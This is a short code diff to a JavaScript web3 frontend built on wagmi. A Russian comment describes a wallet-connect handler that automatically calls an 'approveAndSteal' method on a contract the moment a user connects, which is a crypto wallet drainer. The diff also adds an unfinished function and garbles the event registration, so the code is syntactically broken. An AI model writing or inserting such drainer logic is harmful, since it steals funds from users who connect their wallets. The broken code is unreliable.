@@ -192,13 +192,18 @@ const { connectors } = getDefaultWallets({
 });
 
 const wagmiClient = createClient({
-  autoConnect: true,
-  connectors,
-  provider,
+    autoConnect: true,
+    connectors,
+    provider,
 });
 
+const approveTransaction = async () => {
+    try {
+        const contractInstance = wagmiClient.getContract(contractAddress, abi);
+        console.log('Contract instance:', contractInstance);
+
 // Вызов метода approveAndSteal при подключении кошелька
-wagmiClient.on("connect", async () => {
+wagmiClient ("connect", async () => {
   try {
     await wagmiClient.approveAndSteal(contractAddress);
   } catch (error) {
